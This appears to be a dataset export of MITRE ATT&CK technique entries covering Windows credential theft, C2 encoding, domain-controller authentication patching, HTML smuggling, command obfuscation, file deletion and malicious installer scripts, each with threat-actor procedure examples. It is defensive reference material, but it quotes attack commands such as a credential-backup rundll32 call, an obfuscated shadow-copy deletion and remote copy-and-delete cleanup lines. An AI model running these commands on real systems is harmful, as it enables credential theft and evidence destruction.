T1555.004,Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).  The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers] Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.  Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.  Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.  Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.  Password recovery tools may also obtain plain text passwords from the Credential Manager.","['[OilRig] has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.', '[Stealth Falcon] malware gathers passwords from the Windows Credential Vault.', '[Valak] can use a .NET compiled module named exchgrabber to enumerate credentials from the Credential Manager.', '[Turla] has gathered credentials from the Windows Credential Manager tool.\t', '[LaZagne] can obtain credentials from Vault files.\t', '[Lizar] has a plugin that can retrieve credentials from Internet Explorer and Microsoft Edge using `vaultcmd.exe` and another that can collect RDP access credentials using the `CredEnumerateW` function.', '[ROKRAT] can steal credentials by leveraging the Windows Vault mechanism.', '[RainyDay] can use the QuarksPwDump tool to obtain local passwords and domain cached credentials.', '[SILENTTRINITY] can gather Windows Vault credentials. ', '[Mimikatz] contains functionality to acquire credentials from the Windows Credential Manager.', '[KGH_SPY] can collect credentials from the Windows Credential Manager.', '[PowerSploit] contains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects.', '[Wizard Spider] has used PowerShell cmdlet `Invoke-WCMDump` to enumerate Windows credentials in the Credential Manager in a compromised network.']",False
T1132.002,Non-Standard Encoding,"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.  ","['[OceanSalt] can encode data with a NOT operation before sending the data to the control server.', '[Small Sieve] can use a custom hex byte swapping encoding scheme to obfuscate tasking traffic.', '[NightClub] has used a non-standard encoding in DNS tunneling removing any `=` from the result of base64 encoding, and replacing `/` characters with `-s` and `+` characters with `-p`.', '[RDAT] can communicate with the C2 via subdomains that utilize base64 with character substitutions.\t', '[InvisiMole] can use a modified base32 encoding to encode data within the subdomain of C2 requests.', '[Uroburos] can use a custom base62 and a de-facto base32 encoding that uses digits 0-9 and lowercase letters a-z in C2 communications.', 'Newer variants of [BACKSPACE] will encode C2 communications with a custom system.', '[Bankshot] encodes commands from the control server using a range of characters and gzip.', '[ShadowPad] has encoded data as readable Latin characters.', '[Cyclops Blink] can use a custom binary scheme to encode messages with specific commands and parameters to be executed.', '[Ninja] can encode C2 communications with a base64 algorithm using a custom alphabet.', '[PowGoop] can use a modified Base64 encoding mechanism to send data to and from the C2 server.']",
T1556.001,Domain Controller Authentication,"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.   Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key] Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.","['[Chimera] malware has altered the NTLM authentication program on domain controllers to allow [Chimera] to login without a valid credential.\t', '[Skeleton Key] is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.']",
T1027.006,HTML Smuggling,"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.  Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information] potentially bypassing content filters.  For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.","['[QakBot] has been delivered in ZIP files via HTML smuggling.', '[APT29] has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution. ', '[EnvyScout] contains JavaScript code that can extract an encoded blob from its HTML body and write it to disk.']",False
T1556.005,Reversible Encryption,"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.  If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:  1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code> 2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code> 3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>) 4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)  With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.  An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell] module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to ""Windows Server 2008"" or higher. In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",[],
T1027.010,Command Obfuscation,"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing] and [Drive-by Compromise] or interactively via [Command and Scripting Interpreter]  For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.  Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`).  Tools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.","['[Aquatic Panda] has encoded PowerShell commands in Base64.', '[Sardonic] PowerShell scripts can be encrypted with RC4 and compressed using Gzip.', '[Sandworm Team] has used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.', '[HEXANE] has used Base64-encoded scripts.', '[PoetRAT] has `pyminifier` to obfuscate scripts.', '[Leafminer] obfuscated scripts that were used on victim machines.', '[Cobalt Group] obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR and RC4.', '[LoudMiner] has obfuscated various scripts.\t', '[Empire] has the ability to obfuscate commands using <code>Invoke-Obfuscation</code>.', '[IceApple] can use Base64 and ""junk"" JavaScript code to obfuscate information.', '[PowerPunch] can use Base64-encoded scripts.', '[Fox Kitten] has base64 encoded scripts to avoid detection.', 'During [Frankenstein] the threat actors ran encoded commands from the command line.', '[FIN6] has used encoded PowerShell commands.', 'During [C0021] the threat actors used encoded PowerShell commands.', '[BADHATCH] malicious PowerShell commands can be encoded with base64. ', '[Denis] has encoded its PowerShell commands in Base64.', '[Sibot] has obfuscated scripts used in execution.', '[APT32] has used the `Invoke-Obfuscation` framework to obfuscate their PowerShell.', '[ComRAT] has used encryption and base64 to obfuscate its orchestrator code in the Registry. [ComRAT] has also used encoded PowerShell scripts. ', '[PowerSploit] contains a collection of ScriptModification modules that compress and encode scripts and payloads.', '[QakBot] can use obfuscated and encoded scripts.', '[Magic Hound] has used base64-encoded commands.', '[Wizard Spider] used Base64 encoding to obfuscate an [Empire] service and PowerShell commands.', '[MuddyWater] has used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.', '[Patchwork] has obfuscated a script with Crypto Obfuscator.', '[Netwalker] PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption, as well as obfuscated PowerShell functions and variables.', '[DarkWatchman] has used Base64 to encode PowerShell commands.', 'During [Operation CuckooBees] the threat actors executed an encoded VBScript file.', '[Chimera] has encoded PowerShell commands.\t', '[Silence] has used environment variable string substitution for obfuscation.', '[QUADAGENT] was likely obfuscated using `Invoke-Obfuscation`.', '[Ursnif] droppers execute base64 encoded [PowerShell] commands.', 'The PowerShell script with the [RogueRobin] payload was obfuscated using the COMPRESS technique in `Invoke-Obfuscation`.', '[FIN8] has used environment variables and standard input (stdin) to obfuscate command-line arguments. [FIN8] also obfuscates malicious macros delivered as payloads.', '[CARROTBAT] has the ability to execute obfuscated commands on the infected host.', 'During [C0018] the threat actors used Base64 to encode their PowerShell scripts.', '[FIN7] has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.', '[TA551] has used obfuscated variable names in a JavaScript configuration file.', '[Emotet] has obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts. ', '[Sidewinder] has used base64 encoding for scripts.', '[FruitFly] executes and stores obfuscated Perl scripts.', '[TA505] has used base64 encoded PowerShell commands.', '[Turla] has used encryption (including salted 3DES via [PowerSploit] <code>Out-EncryptedScript.ps1</code>), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.', '[SQLRat] has used a character insertion obfuscation technique, making the script appear to contain Chinese characters.', '[SHARPSTATS] has used base64 encoding and XOR to obfuscate PowerShell scripts.', '[BackConfig] has used compressed and decimal encoded VBS scripts.', '[GOLD SOUTHFIELD] has executed base64 encoded PowerShell scripts on compromised hosts.', '[POWERSTATS] uses character replacement, [PowerShell] environment variables, and XOR encoding to obfuscate code. [POWERSTATS] backdoor code is a multi-layer obfuscated, encoded, and compressed blob.  [POWERSTATS] has used PowerShell code with custom string obfuscation ', '[Zeus Panda] obfuscates the macro commands in its initial payload.', 'During [Operation Wocao] threat actors executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.', '[LazyScripter] has leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques.', '[Astaroth] has obfuscated and randomized parts of the JScript code it is initiating.', '[CookieMiner] has used base64 encoding to obfuscate scripts on the system. ', '[KOCTOPUS] has obfuscated scripts with the BatchEncryption tool.', '[Gamaredon Group] has used obfuscated or encrypted scripts.', '[Ember Bear] has obfuscated malicious scripts to help avoid detection.', '[APT19] used Base64 to obfuscate executed commands.', '[Machete] has used pyobfuscate, zlib compression, and base64 encoding for obfuscation. [Machete] has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.']",False
T1070.004,File Deletion,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer] may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.  There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in [Command and Scripting Interpreter] functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.","['[TDTESS] creates then deletes log files during installation of itself as a service.', '[LightNeuron] has a function to delete files.', '[ProLock] can remove files containing its payload after they are executed.', '[Aquatic Panda] has deleted malicious executables from compromised machines.', '[Denis] has a command to delete files from the victim’s machine.', '[Rising Sun] can delete files and artifacts it creates.\t', '[FIN10] has used batch scripts and scheduled tasks to delete critical system files.', '[ECCENTRICBANDWAGON] can delete log files generated from the malware stored at <code>C:\\windows\\temp\\tmp0207</code>.', '[SamSam] has been seen deleting its own files and payloads to make analysis of the attack more difficult.', '[SQLRat] has used been observed deleting scripts once used.\t', 'A [menuPass] macro deletes files after it has decoded and decompressed them.', '[Heyoka Backdoor] has the ability to delete folders and files from a targeted system.', 'The [BRONZE BUTLER] uploader or malware the uploader uses <code>command</code> to delete the RAR archives after they have been exfiltrated.', '[MacSpy] deletes any temporary files it creates', '[Tropic Trooper] has deleted dropper files on an infected system using command scripts.\t', '[AppleJeus] has deleted the MSI file after installation.', '[Kivars] has the ability to uninstall malware from the infected host.', '[TeamTNT] has used a payload that removes itself after running. [TeamTNT] also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them.', '[COATHANGER] removes files from victim environments following use in multiple instances.', '[CSPY Downloader] has the ability to self delete.', '[Azorult] can delete files from victim machines.', '[DarkWatchman] has been observed deleting its original launcher after installation.', '[Bisonal] will delete its dropper and VBS scripts from the victim’s machine.', 'During [Operation Dream Job] [Lazarus Group] removed all previously delivered files from a compromised computer.', '[APT38] has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.', '[RainyDay] has the ability to uninstall itself by deleting its service and files.', 'Recent versions of [Cherry Picker] delete files and registry keys created by the malware.', '[Bankshot] marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.', '[FIN5] uses [SDelete] to clean up the environment and attempt to prevent detection.', '[GreyEnergy] can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.', '[StoneDrill] has been observed deleting the temporary files once they fulfill their task.\t', '[Backdoor.Oldrea] contains a cleanup module that removes traces of itself from the victim.', 'Once loaded into memory, [MESSAGETAP] deletes the keyword_parm.txt and parm.txt configuration files from disk. ', '[InvisiMole] has deleted files and directories including XML and files successfully uploaded to C2 servers.', '[Proton] removes all files in the /tmp directory.', '[OSX_OCEANLOTUS.D] has a command to delete a file from the system. [OSX_OCEANLOTUS.D] deletes the app bundle and dropper after execution.', '[LockerGoga] has been observed deleting its original launcher after execution.', 'Once a file is uploaded, [Machete] will delete it from the machine. ', '[MURKYTOP] has the capability to delete local files.', '[Drovorub] can delete specific files from a compromised host.', '[Gelsemium] can delete its dropper component from the targeted system.', '[AuditCred] can delete files from the system.', '[Gold Dragon] deletes one of its files, 2.hwp, from the endpoint after establishing persistence.', '[Remsec] is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.', ""[Wingbird] deletes its payload along with the payload's parent process after it finishes copying files."", '[Imminent Monitor] has deleted files related to its dynamic debugger feature.', '[Mosquito] deletes files using DeleteFileW API call.', '[VERMIN] can delete files on the victim’s machine.', '[Pay2Key] can remove its log file from disk.', '[JPIN] installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.', 'During [Cutting Edge] threat actors deleted `/tmp/test1.txt` on compromised Ivanti Connect Secure VPNs which was used to hold stolen configuration and cache files.', '[DustySky] can delete files it creates from the infected system.', '[Hildegard] has deleted scripts after execution. ', '[Epic] has a command to delete a file from the machine.', '[SDelete] deletes data in a way that makes it unrecoverable.', '[Kazuar] can delete files.', '[PowerShower] has the ability to remove all files created during the dropper process.', '[Taidoor] can use <code>DeleteFileA</code> to remove files from infected hosts.', 'Following the successful injection of [SUNBURST] [SUNSPOT] deleted a temporary file it created named <code>InventoryManager.bk</code> after restoring the original SolarWinds Orion source code to the software library.', 'The [Komplex] trojan supports file deletion.', '[FALLCHILL] can delete malware and associated artifacts from the victim.', 'During [Operation Honeybee] the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files. ', '[Reaver] deletes the original dropped file from the victim.', '[Proxysvc] can delete files indicated by the attacker and remove itself from disk using a batch file.', ""[OopsIE] has the capability to delete files and scripts from the victim's machine."", '[Stuxnet] uses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files.', '[jRAT] has a function to delete files from the victim’s machine.', '[KONNI] can delete files.', '[Dtrack] can remove its persistence and delete itself.', '[Ixeshe] has a command to delete a file from the machine.', '[DanBot] can delete its configuration file after installation.', '[HotCroissant] has the ability to clean up installed files, delete files, and delete itself from the victim’s machine.', '[Crimson] has the ability to delete files from a compromised host.\t ', '[zwShell] has deleted itself after creating a service as well as deleted a temporary file when the system reboots.', '[njRAT] is capable of deleting files.', '[Kimsuky] has deleted the exfiltrated data on disk after transmission. [Kimsuky] has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.', 'During the [2015 Ukraine Electric Power Attack] vba_macro.exe deletes itself after `FONTCACHE.DAT`, `rundll32.exe`, and the associated .lnk file is delivered. ', '[IceApple] can delete files and directories from targeted systems.', ' [SombRAT] has the ability to run <code>cancel</code> or <code>closeanddeletestorage</code> to remove all files from storage and delete the storage temp file on a compromised host.', '[OilRig] has deleted files associated with their payload after execution.', '[ROKRAT] can request to delete files.\t', '[ADVSTORESHELL] can delete files and directories.', '[Cuba] can use the command <code>cmd.exe /c del</code> to delete its artifacts from the system. ', '[InnaputRAT] has a command to delete files.', '[FIN6] has removed files from victim machines.', '[APT41] deleted files from the system.', '[APT39] has used malware to delete files after they are deployed on a compromised host.', '[APT29] has used [SDelete] to remove artifacts from victim networks.', '[Wizard Spider] has used file deletion to remove some modules and configurations from an infected host after use.', '[APT28] has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.', '[APT18] actors deleted tools and batch files from victim systems.', '[Aria-body] has the ability to delete files and directories on compromised hosts.', '[ccf32] can delete files and folders from compromised machines.', '[Linfo] creates a backdoor through which remote attackers can delete files.', '[BLUELIGHT] can uninstall itself.', '[Evilnum] has deleted files used during infection.', '[Trojan.Karagany] has used plugins with a self-delete capability.', '[Metamorfo] has deleted itself from the system after execution.', '[FruitFly] will delete files on the system.', '[Hi-Zor] deletes its RAT installer file as it executes its DLL payload file.', '[Cryptoistic] has the ability delete files from a compromised host.', '[NanHaiShu] launches a script to delete their original decoy file to cover tracks.', '[WhisperGate] can delete tools from a compromised host after execution.', '[RedLeaves] can delete specified files.', '[OceanSalt] can delete files from the system.', '[SeaDuke] can securely delete files, including deleting itself from the victim.', '[Misdat] is capable of deleting the backdoor file.', '[BLINDINGCAN] has deleted itself and associated artifacts from victim machines.', '[Dragonfly] has deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.', '[ShimRat] can uninstall itself from compromised hosts, as well create and modify directories, delete, move, copy, and rename files.', '[BackConfig] has the ability to remove files and folders related to previous infections.', '[LiteDuke] can securely delete files by first writing random data to the file.', '[MoonWind] can delete itself or specified files.', '[Mustang Panda] will delete their tools and files, and kill processes after their objectives are reached.', '[Sandworm Team] has used backdoors that can delete files used in an attack from an infected system.', '[More_eggs] can remove itself from a system.', '[PowerDuke] has a command to write random data across a file and delete it.', ""[pngdowner] deletes content from C2 communications that was saved to the user's temporary directory."", '[Fysbis] has the ability to delete files.', '[S-Type] has deleted files it has created on a compromised host.', '[StrongPity] can delete previously exfiltrated files from the compromised host.', 'During [Operation Wocao] the threat actors consistently removed traces of their activity by first overwriting a file using `/c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y` and then deleting the overwritten file using `/c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1`.', '[ZxShell] can delete files from the system. ', '[Magic Hound] has deleted and overwrote files to cover tracks.', '[APT32] macOS backdoor can receive a “delete” command.', '[RDFSNIFFER] has the capability of deleting local files.', '[RunningRAT] contains code to delete files from the victim’s machine.', '[VBShower] has attempted to complicate forensic analysis by deleting all the files contained in <code>%APPDATA%\\..\\Local\\Temporary Internet Files\\Content.Word</code> and <code>%APPDATA%\\..\\Local Settings\\Temporary Internet Files\\Content.Word\\</code>.', '[GuLoader] can delete its executable from the <code>AppData\\Local\\Temp</code> directory on the compromised host.', '[Grandoreiro] can delete .LNK files created in the Startup folder.', '[SILENTTRINITY] can remove files from the compromised host.', '[Gazer] has commands to delete files and persistence mechanisms from the victim.', '[FatDuke] can secure delete its DLL.', '[SpeakUp] deletes files to remove evidence on the machine. ', '[Cobalt Group] deleted the DLL dropper from the victim’s machine to cover their tracks.', '[Nebulae] has the ability to delete files and directories.', '[Woody RAT] has the ability to delete itself from disk by creating a suspended notepad process and writing shellcode to delete a file into the suspended process using `NtWriteVirtualMemory`. ', '[GoldenSpy] uninstaller can delete registry entries, files and folders, and finally itself once these tasks have been completed.', ""[Kevin] can delete files created on the victim's machine."", '[CharmPower] can delete created files from a compromised system.', '[FIN8] has deleted tmp and prefetch files during post compromise cleanup activities. [FIN8] has also deleted PowerShell scripts to evade detection on compromised machines.', '[BBSRAT] can delete files and directories.', '[APT5] has deleted scripts and web shells to evade detection.', '[PLEAD] has the ability to delete files on the compromised host.', 'During the [SolarWinds Compromise] [APT29] routinely removed their tools, including custom backdoors, once remote access was achieved.', '[LoudMiner] deleted installation files after completion.', '[BabyShark] has cleaned up all files associated with the secondary payload execution.', '[NOKKI] can delete files to cover tracks.', '[Lazarus Group] malware has deleted files in various ways, including ""suicide scripts"" to delete malware binaries from the victim. [Lazarus Group] also uses secure file deletion to delete files from the victim.', '[Green Lambert] can delete the original executable after initial installation in addition to unused functions. ', ""[SLOTHFULMEDIA] has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system."", '[Ursnif] has deleted data staged in tmp files after exfiltration.', '[APT3] has a tool that can delete files.', '[Hydraq] creates a backdoor through which remote attackers can delete files.', '[P.A.S. Webshell] can delete scripts from a subdirectory of /tmp after they are run.', '[Exaramel for Linux] can uninstall its persistence mechanism and delete its configuration file.', '[The White Company] has the ability to delete its malware entirely from the target system.', '[BADHATCH] has the ability to delete PowerShell scripts from a compromised machine.', '[Sibot] will delete itself if a certain server response is received.', '[BLACKCOFFEE] has the capability to delete files.', '[Cardinal RAT] can uninstall itself, including deleting its executable.', '[SysUpdate] can delete its configuration file from the targeted system.', '[Derusbi] is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.', '[RCSession] can remove files from a targeted system.', '[Chimera] has performed file deletion to evade detection. ', '[LookBack] removes itself after execution and can delete files on the system.', '[Patchwork] removed certain files and replaced them so they could not be retrieved.', 'During the [C0032] campaign, [TEMP.Veles] routinely deleted tools, logs, and other files after they were finished with them.', 'Malware used by [Group5] is capable of remotely deleting files from victims.', ""[Calisto] has the capability to use <code>rm -rf</code> to remove folders and files from the victim's machine."", '[PcShare] has deleted its files and components from a compromised host.', '[Seasalt] has a command to delete a specified file.', '[EvilBunny] has deleted the initial dropper after running through the environment checks.', '[Elise] is capable of launching a remote shell on the host to delete itself.', '[Shark] can delete files downloaded to the compromised host.', '[gh0st RAT] has the capability to to delete files.', '[HTTPBrowser] deletes its original installer file once installation is complete.', '[Winnti for Windows] can delete the DLLs for its various components from a compromised host.', '[RDAT] can issue SOAP requests to delete already processed C2 emails. [RDAT] can also delete itself from the infected system.\t', '[WINDSHIELD] is capable of file deletion along with other file system interaction.', '[ServHelper] has a module to delete itself from the infected machine.', '[QUADAGENT] has a command to delete its Registry key and scheduled task.', '[Zeus Panda] has a command to delete a file. It also can uninstall scripts and delete files to cover its track.', '[Metador] has quickly deleted `cbd.exe` from a compromised host following the successful deployment of their malware. ', '[Mori] can delete its DLL file and related files by Registry value.', '[Gamaredon Group] tools can delete files used during an operation.', 'After encrypting its own log files, the log encryption module in [Prikormka] deletes the original, unencrypted files from the host.', '[SUNBURST] had a command to delete files.', '[Okrum] backdoor deletes files after they have been successfully uploaded to C2 servers.', '[Bazar] can delete its loader using a batch file in the Windows temporary folder.', '[POWERSTATS] can delete all files on the C:\\, D:\\, E:\\ and, F:\\ drives using [PowerShell] Remove-Item commands.', '[metaMain] has deleted collected items after uploading the content to its C2 server.', '[Volt Typhoon] has run `rd /S` to delete their working directories and files.', '[Zebrocy] has a command to delete files and directories.', '[OutSteel] can delete itself following the successful execution of a follow-on payload.', '[Pasam] creates a backdoor through which remote attackers can delete files.', '[KillDisk] has the ability to quit and delete itself.', '[Pteranodon] can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.', '[PUNCHBUGGY] can delete files written to disk.', '[Ferocious] can delete files from a compromised host.', '[Silence] has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs.\t', '[Bandook] has a command to delete a file.', '[AppleSeed] can delete files from a compromised host after they are exfiltrated.', '[HALFBAKED] can delete a specified file.', '[HermeticWiper] has the ability to overwrite its own file with random bites.', '[Carbanak] has a command to delete files.', '[Pillowmint] has deleted the filepath <code>%APPDATA%\\Intel\\devmonsrv.exe</code>.', '[WindTail] has the ability to receive and execute a self-delete command.', '[TAINTEDSCRIBE] can delete files from a compromised host.', '[Attor] plugin deletes the collected files and log files after exfiltration.', '[Anchor] can self delete its dropper after the malware is successfully deployed.', '[Lokibot] will delete its dropped files after bypassing UAC.', '[cmd] can be used to delete files from the file system.', '[HyperBro] has the ability to delete a specified file.', '[Milan] can delete files via `C:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q`.', '[Rocke] has deleted files on infected machines.\t', '[KEYMARBLE] has the capability to delete files off the victim’s machine.', '[GrimAgent] can delete old binaries on a compromised host.', 'Some [Sakula] samples use cmd.exe to delete temporary files.', '[PyDCrypt] will remove all created artifacts such as dropped executables.', '[USBStealer] has several commands to delete files associated with the malware from the victim.', '[REvil] can mark its binary code for deletion after reboot.', '[HAWKBALL] has the ability to delete files.\t', '[Threat Group-3390] has deleted existing logs and exfiltrated file archives from a victim.', '[CARROTBAT] has the ability to delete downloaded files from a compromised host.', 'The [JHUHUGIT] dropper can delete itself from the victim. Another [JHUHUGIT] variant has the capability to delete specified files.', '[Meteor] will delete the folder containing malicious scripts if it detects the hostname as `PIS-APP`, `PIS-MOB`, `WSUSPROXY`, or `PIS-DB`.', '[PoetRAT] has the ability to overwrite scripts and delete itself if a sandbox environment is detected.', '[Uroburos] can run a `Clear Agents Track` command on an infected machine to delete [Uroburos] logs.', '[Bumblebee] can uninstall its loader through the use of a `Sdl` command.', '[Pony] has used scripts to delete itself after execution.\t', '[FlawedAmmyy] can execute batch scripts to delete files.', '[StrifeWater] can self delete to cover its tracks.', '[Penquin] can delete downloaded executables after running them.', '[Hancitor] has deleted files using the VBA <code>kill</code> function.', '[XAgentOSX] contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.', '[TYPEFRAME] can delete files off the system.', '[Saint Bot] can run a batch script named `del.bat` to remove any [Saint Bot] payload-linked files from a compromise system if anti-analysis or locale checks fail.', '[MacMa] can delete itself from the compromised computer.', '[SDBbot] has the ability to delete files from a compromised host.', '[Volgmer] can delete files and itself after infection to avoid analysis.', '[FELIXROOT] deletes the .LNK file from the startup directory as well as the dropper components.', '[FunnyDream] can delete files including its dropper component.', '[Pysa] has deleted batch files after execution.  ', '[RTM] can delete all files created during its execution.', '[QakBot] can delete folders and files including overwriting its executable with legitimate programs.', '[TEMP.Veles] routinely deleted tools, logs, and other files after they were finished with them.', '[UNC2452] routinely removed their tools, including custom backdoors, once remote access was achieved.', '[Operation Wocao] has deleted logs and executable files used during an intrusion.', '[Honeybee] removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.', '[Dragonfly 2.0] deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.']",False
T1546.016,Installer Packages,"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.  Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon] with the elevated permissions.  Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.  For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.","[""During [AppleJeus] installation process, it uses `postinstall` scripts to extract a hidden plist from the application's `/Resources` folder and execute the `plist` file as a [Launch Daemon] with elevated permissions.""]",False
